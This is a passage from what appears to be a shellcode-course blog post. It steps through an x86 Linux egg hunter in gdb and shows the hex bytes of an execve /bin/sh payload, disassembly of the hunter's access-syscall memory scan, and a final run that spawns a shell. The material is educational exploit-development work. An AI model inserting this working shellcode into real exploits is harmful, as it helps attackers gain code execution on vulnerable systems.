</code></pre></div> <p>Taking a look at the source code, is is clear that the memory address <code class="highlighter-rouge">0x804a0a0</code> pointed to the first <code class="highlighter-rouge">EGG</code> at the beginning of the shellcode.</p> <p>After the <code class="highlighter-rouge">scas</code> instruction added four bytes to <code class="highlighter-rouge">0x804a0a0</code>, <code class="highlighter-rouge">EDI</code> has now been incremented to <code class="highlighter-rouge">0x804a0a4</code> and currently points to the second <code class="highlighter-rouge">EGG</code> before the start of the shellcode.</p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">second_stage</span><span class="p">[]</span> <span class="o">=</span> \
                                <span class="n">EGG</span>
                                <span class="n">EGG</span>
                                <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68</span><span class="s">"</span>
                                <span class="s">"</span><span class="se">\x68\x2f\x2f\x62\x69\x89\xe3\x50</span><span class="s">"</span>
                                <span class="s">"</span><span class="se">\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span> <span class="c1">// /bin/sh execve-stack
</span></code></pre></div> <p>The same <code class="highlighter-rouge">DWORD</code> string comparison is conducted between the value in the <code class="highlighter-rouge">EAX</code> register, which is the egg, <code class="highlighter-rouge">0x534b534b</code>, and the value in the memory address currently pointed to by <code class="highlighter-rouge">EDI</code>, which is <code class="highlighter-rouge">0x4b 0x53 0x4b 0x53</code>. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following <code class="highlighter-rouge">jmp edi</code> instruction.</p> <p>After the string comparison occurred, the <code class="highlighter-rouge">scas</code> instruction adds four bytes to the memory location pointed to by <code class="highlighter-rouge">EDI</code>. As such, <code class="highlighter-rouge">EDI</code> has been updated from <code class="highlighter-rouge">0x804a0a4</code> to <code class="highlighter-rouge">0x804a0a8</code> and now points to the beginning of the shellcode after the two egg identifiers.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="err">$</span><span class="mi">4049</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4050</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4051</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4052</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="mh">0x804a0a4</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>
<span class="n">eflags</span>         <span class="mh">0x246</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">ZF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a083</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4053</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4054</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4055</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4056</span> <span class="o">=</span> <span class="mh">0x804a0a8</span>
<span class="mh">0x804a0a8</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="mh">0x31</span>	<span class="mh">0xc0</span>	<span class="mh">0x50</span>	<span class="mh">0x68</span>
<span class="n">eflags</span>         <span class="mh">0x246</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">ZF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a084</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
</code></pre></div> <p>After performing an unconditional jump to the memory location referenced by the <code class="highlighter-rouge">EDI</code> register, the execution of the process is redirected to <code class="highlighter-rouge">0x0804a0a8</code> which contains the first instruction of the <code class="highlighter-rouge">exexve-stack</code> <code class="highlighter-rouge">/bin/sh</code> shellcode. Continuing the execution of the process results in the execution of <code class="highlighter-rouge">/bin/sh</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4057</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4058</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4059</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4060</span> <span class="o">=</span> <span class="mh">0x804a0a8</span>
<span class="mh">0x804a0a8</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="mh">0x31</span>	<span class="mh">0xc0</span>	<span class="mh">0x50</span>	<span class="mh">0x68</span>
<span class="n">eflags</span>         <span class="mh">0x246</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">ZF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a086</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4061</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4062</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4063</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4064</span> <span class="o">=</span> <span class="mh">0x804a0a8</span>
<span class="mh">0x804a0a8</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="mh">0x31</span>	<span class="mh">0xc0</span>	<span class="mh">0x50</span>	<span class="mh">0x68</span>
<span class="n">eflags</span>         <span class="mh">0x246</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">ZF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">second_stage</span><span class="o">:</span>
   <span class="mh">0x0804a0a0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">dec</span>    <span class="n">ebx</span>
   <span class="mh">0x0804a0a1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
   <span class="mh">0x0804a0a2</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">dec</span>    <span class="n">ebx</span>
   <span class="mh">0x0804a0a3</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
   <span class="mh">0x0804a0a4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">dec</span>    <span class="n">ebx</span>
   <span class="mh">0x0804a0a5</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
   <span class="mh">0x0804a0a6</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="k">dec</span>    <span class="n">ebx</span>
   <span class="mh">0x0804a0a7</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a0a8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a0aa</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">eax</span>
   <span class="mh">0x0804a0ab</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x68732f6e</span>
   <span class="mh">0x0804a0b0</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x69622f2f</span>
   <span class="mh">0x0804a0b5</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x0804a0b7</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">eax</span>
   <span class="mh">0x0804a0b8</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x0804a0ba</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
   <span class="mh">0x0804a0bb</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x0804a0bd</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xb</span>
   <span class="mh">0x0804a0bf</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a0c1</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a0a8</span> <span class="k">in</span> <span class="n">second_stage</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="n">process</span> <span class="mi">5139</span> <span class="n">is</span> <span class="n">executing</span> <span class="n">new</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span>
<span class="n">Error</span> <span class="k">in</span> <span class="n">re</span><span class="o">-</span><span class="n">setting</span> <span class="n">breakpoint</span> <span class="mi">1</span><span class="o">:</span> <span class="n">No</span> <span class="n">symbol</span> <span class="n">table</span> <span class="n">is</span> <span class="n">loaded</span><span class="p">.</span>  <span class="n">Use</span> <span class="n">the</span> <span class="s">"file"</span> <span class="n">command</span><span class="p">.</span>
<span class="n">Error</span> <span class="k">in</span> <span class="n">re</span><span class="o">-</span><span class="n">setting</span> <span class="n">breakpoint</span> <span class="mi">1</span><span class="o">:</span> <span class="n">No</span> <span class="n">symbol</span> <span class="n">table</span> <span class="n">is</span> <span class="n">loaded</span><span class="p">.</span>  <span class="n">Use</span> <span class="n">the</span> <span class="s">"file"</span> <span class="n">command</span><span class="p">.</span>
<span class="n">Error</span> <span class="k">in</span> <span class="n">re</span><span class="o">-</span><span class="n">setting</span> <span class="n">breakpoint</span> <span class="mi">1</span><span class="o">:</span> <span class="n">No</span> <span class="n">symbol</span> <span class="n">table</span> <span class="n">is</span> <span class="n">loaded</span><span class="p">.</span>  <span class="n">Use</span> <span class="n">the</span> <span class="s">"file"</span> <span class="n">command</span><span class="p">.</span>
<span class="err">$</span>
</code></pre></div> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#egg%20hunter" title="Pages tagged egg hunter" class="tag"><span class="term">egg hunter</span></a><a href="http://localhost:4000/tags/#access%20syscall" title="Pages tagged access syscall" class="tag"><span class="term">access syscall</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-3/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-3/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-3/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
